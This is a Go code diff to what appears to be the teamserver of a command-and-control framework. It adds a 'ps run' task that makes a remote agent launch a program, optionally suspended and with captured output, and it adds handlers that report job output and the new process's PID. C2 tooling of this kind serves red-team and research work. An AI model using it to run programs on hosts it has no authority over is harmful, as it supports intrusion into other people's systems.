@@ -299,8 +299,33 @@ func CreateTask(ts Teamserver, agent AgentData, command string, args map[string]
 				goto RET
 			}
 			array = []interface{}{COMMAND_PS_KILL, int(pid)}
+
+		} else if subcommand == "run" {
+			messageInfo = "Task: create new process"
+			taskData.Type = JOB
+
+			output, _ := args["-o"].(bool)
+			suspend, _ := args["-s"].(bool)
+			programState := 0
+			if suspend {
+				programState = 4
+			}
+			programArgs, ok := args["args"].(string)
+			if ok {
+				programArgs = ConvertUTF8toCp(programArgs, agent.ACP)
+			}
+
+			program, ok := args["program"].(string)
+			if !ok {
+				err = errors.New("parameter 'program' must be set")
+				goto RET
+			}
+			program = ConvertUTF8toCp(program, agent.ACP)
+
+			array = []interface{}{COMMAND_PS_RUN, output, programState, program, programArgs}
+
 		} else {
-			err = errors.New("subcommand must be 'list' or 'kill'")
+			err = errors.New("subcommand must be 'list', 'kill' or 'run'")
 			goto RET
 		}
 		break
@@ -540,6 +565,22 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 			}
 			break
 
+		case COMMAND_JOB:
+			state := packer.ParseInt8()
+			if state == JOB_STATE_RUNNING {
+				task.Completed = false
+				jobOutput := ConvertCpToUTF8(string(packer.ParseString()), agentData.OemCP)
+				task.Message = fmt.Sprintf("Job [%v] output:", task.TaskId)
+				task.ClearText = jobOutput
+			} else if state == JOB_STATE_KILLED {
+				task.Completed = true
+				task.Message = fmt.Sprintf("Job [%v] canceled", task.TaskId)
+			} else if state == JOB_STATE_FINISHED {
+				task.Completed = true
+				task.Message = fmt.Sprintf("Job [%v] finished", task.TaskId)
+			}
+			break
+
 		case COMMAND_LS:
 			result := packer.ParseInt8()
 
@@ -712,6 +753,20 @@ func ProcessTasksResult(ts Teamserver, agentData AgentData, taskData TaskData, p
 		case COMMAND_PS_KILL:
 			pid := packer.ParseInt32()
 			task.Message = fmt.Sprintf("Process %d killed", pid)
+			break
+
+		case COMMAND_PS_RUN:
+			pid := packer.ParseInt32()
+			isOutput := packer.ParseInt8()
+			prog := ConvertCpToUTF8(string(packer.ParseString()), agentData.ACP)
+
+			status := "no output"
+			if isOutput > 0 {
+				status = "with output"
+			}
+
+			task.Completed = false
+			task.Message = fmt.Sprintf("Program %v started with PID %d (output - %v)", prog, pid, status)
 			break
 
 		case COMMAND_PWD:
